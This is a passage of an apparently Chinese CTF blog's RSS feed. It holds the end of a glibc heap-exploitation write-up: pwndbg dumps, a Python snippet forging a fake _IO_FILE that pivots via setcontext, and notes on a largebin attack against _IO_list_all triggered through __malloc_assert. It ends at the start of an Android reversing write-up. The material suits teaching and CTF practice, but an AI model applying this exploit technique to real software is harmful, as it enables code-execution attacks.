class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; heap&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Allocated chunk | PREV_INUSE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Addr: &lt;span class=&#34;number&#34;&gt;0x5609eb575000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Size: &lt;span class=&#34;number&#34;&gt;0x291&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Free &lt;span class=&#34;title function_&#34;&gt;chunk&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(largebins)&lt;/span&gt; | PREV_INUSE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Addr: 0x5609eb575290&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Size: 0x451&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fd: 0x7f2adf8f70e0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bk: 0x5609eb575b00&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fd_nextsize: 0x5609eb575b00&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bk_nextsize: 0x5609eb575b00&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Allocated chunk&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Addr: 0x5609eb5756e0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Size: 0x420&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Free &lt;span class=&#34;title function_&#34;&gt;chunk&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(largebins)&lt;/span&gt; | PREV_INUSE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Addr: 0x5609eb575b00&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Size: 0x461&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fd: 0x5609eb575290&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bk: 0x7f2adf8f70e0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fd_nextsize: 0x5609eb575290&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bk_nextsize: 0x5609eb575290&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Allocated chunk&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Addr: 0x5609eb575f60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Size: 0x420&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Allocated chunk | PREV_INUSE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Addr: 0x5609eb576380&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Size: 0x441&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Allocated chunk | PREV_INUSE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Addr: 0x5609eb5767c0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Size: 0x471&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Top chunk | PREV_INUSE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Addr: 0x5609eb576c30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Size: 0x1f3d1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;接下来就是获取到_IO_list_all 的位置，然后进行伪造 iofile&lt;/p&gt;
&lt;p&gt;伪造的模板，作者已经提供了，这里是用到了 setcontext 进行参数的设置，我们需要手动更改下 fake_io_addr 的地址为我们控制的 chunk 地址，这里就是 largebin attack 生效的攻击地址。&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;fake_io_addr=heapbase+&lt;span class=&#34;number&#34;&gt;0xb00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;next_chain = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_IO_FILE=p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_IO_FILE +=p64(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;span class=&#34;comment&#34;&gt;#&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_IO_FILE +=p64(fake_io_addr+&lt;span class=&#34;number&#34;&gt;0xb0&lt;/span&gt;)&lt;span class=&#34;comment&#34;&gt;#_IO_backup_base=setcontext_rdx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_IO_FILE +=p64(setcontext+&lt;span class=&#34;number&#34;&gt;61&lt;/span&gt;)&lt;span class=&#34;comment&#34;&gt;#_IO_save_end=call addr(call setcontext)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_IO_FILE = fake_IO_FILE.ljust(&lt;span class=&#34;number&#34;&gt;0x58&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_IO_FILE += p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# _chain&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_IO_FILE = fake_IO_FILE.ljust(&lt;span class=&#34;number&#34;&gt;0x78&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_IO_FILE += p64(heapbase+&lt;span class=&#34;number&#34;&gt;0x1000&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# _lock = a writable address&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_IO_FILE = fake_IO_FILE.ljust(&lt;span class=&#34;number&#34;&gt;0x90&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_IO_FILE +=p64(fake_io_addr+&lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;)&lt;span class=&#34;comment&#34;&gt;#_wide_data,rax1_addr&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_IO_FILE = fake_IO_FILE.ljust(&lt;span class=&#34;number&#34;&gt;0xB0&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_IO_FILE += p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# _mode = 0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_IO_FILE = fake_IO_FILE.ljust(&lt;span class=&#34;number&#34;&gt;0xC8&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_IO_FILE += p64(libcbase+&lt;span class=&#34;number&#34;&gt;0x2160c0&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# vtable=IO_wfile_jumps+0x10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_IO_FILE +=p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_IO_FILE += p64(fake_io_addr+&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# rax2_addr&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;伪造好后的_io_file&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p &amp;amp;_IO_list_all&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; = (&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _IO_FILE_plus **) &lt;span class=&#34;number&#34;&gt;0x7f85fb7ee680&lt;/span&gt; &amp;lt;_IO_list_all&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p *(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _IO_FILE_plus **) &lt;span class=&#34;number&#34;&gt;0x7f85fb7ee680&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; = (&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _IO_FILE_plus *) &lt;span class=&#34;number&#34;&gt;0x563e47a6c370&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p*(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _IO_FILE_plus *) &lt;span class=&#34;number&#34;&gt;0x563e47a6c370&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _flags = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_ptr = &lt;span class=&#34;number&#34;&gt;0x451&lt;/span&gt; &amp;lt;error: Cannot access memory at address &lt;span class=&#34;number&#34;&gt;0x451&lt;/span&gt;&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_end = &lt;span class=&#34;number&#34;&gt;0x7f85fb7ee0e0&lt;/span&gt; &amp;lt;main_arena+&lt;span class=&#34;number&#34;&gt;1120&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;\320\340~\373\205\177&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_base = &lt;span class=&#34;number&#34;&gt;0x563e47a6b290&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_base = &lt;span class=&#34;number&#34;&gt;0x563e47a6b290&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_ptr = &lt;span class=&#34;number&#34;&gt;0x7f85fb7ee660&lt;/span&gt; &amp;lt;_nl_global_locale+&lt;span class=&#34;number&#34;&gt;224&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;\327\341z\373\205\177&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_end = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_buf_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_buf_end = &lt;span class=&#34;number&#34;&gt;0x1&lt;/span&gt; &amp;lt;error: Cannot access memory at address &lt;span class=&#34;number&#34;&gt;0x1&lt;/span&gt;&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_save_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_backup_base = &lt;span class=&#34;number&#34;&gt;0x563e47a6c420&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_save_end = &lt;span class=&#34;number&#34;&gt;0x7f85fb627a6d&lt;/span&gt; &amp;lt;setcontext+&lt;span class=&#34;number&#34;&gt;61&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;H\213\242\240&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _markers = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _chain = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _fileno = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _flags2 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _old_offset = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _cur_column = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _vtable_offset = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;\000&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _shortbuf = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _lock = &lt;span class=&#34;number&#34;&gt;0x563e47a6c000&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _offset = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _codecvt = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _wide_data = &lt;span class=&#34;number&#34;&gt;0x563e47a6c3a0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _freeres_list = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _freeres_buf = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __pad5 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _mode = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _unused2 = &lt;span class=&#34;string&#34;&gt;&amp;#x27;\000&amp;#x27;&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;19&lt;/span&gt; times&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  vtable = &lt;span class=&#34;number&#34;&gt;0x7f85fb7ea0e0&lt;/span&gt; &amp;lt;_IO_wfile_jumps+&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;接下来就是如何触发 exit，利用__malloc_assert 报错，这里可以修改 topchunk 的 size 进行报错。这里依旧可以选择进行 largebin attack. 文章最开始有介绍如何进行连续的两次 attack 。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/07/20/360dsctf2022-eznote/</guid>
            <title>360dsctf2022_eznote</title>
            <link>http://example.com/2022/07/20/360dsctf2022-eznote/</link>
            <pubDate>Wed, 20 Jul 2022 16:40:00 +0800</pubDate>
            <description><![CDATA[  ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/07/18/adworld-%E5%9F%BA%E7%A1%80%E7%9A%84android/</guid>
            <title>adworld_基础的android</title>
            <link>http://example.com/2022/07/18/adworld-%E5%9F%BA%E7%A1%80%E7%9A%84android/</link>
            <category>writeup</category>
            <pubDate>Mon, 18 Jul 2022 11:08:17 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;adworld_mobile基础的android&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#adworld_mobile基础的android&#34;&gt;#&lt;/a&gt; adworld_mobile—— 基础的 android&lt;/h1&gt;
&lt;h5 id=&#34;这是一个新的系列这里记录的是我自己在学习安卓逆向过程中的刷题记录&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#这是一个新的系列这里记录的是我自己在学习安卓逆向过程中的刷题记录&#34;&gt;#&lt;/a&gt; 这是一个新的系列，这里记录的是我自己在学习安卓逆向过程中的刷题记录。&lt;/h5&gt;
&lt;h3 id=&#34;首先我们来看看项目的注册声明&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#首先我们来看看项目的注册声明&#34;&gt;#&lt;/a&gt; 首先我们来看看项目的注册声明&lt;/h3&gt;
&lt;h4 id=&#34;mainfestxml&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#mainfestxml&#34;&gt;#&lt;/a&gt; Mainfest.xml&lt;/h4&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?xml version=&lt;span class=&#34;string&#34;&gt;&amp;quot;1.0&amp;quot;&lt;/span&gt; encoding=&lt;span class=&#34;string&#34;&gt;&amp;quot;UTF-8&amp;quot;&lt;/span&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;manifest android:versionCode=&lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt; android:versionName=&lt;span class=&#34;string&#34;&gt;&amp;quot;1.0&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;package&lt;/span&gt;=&lt;span 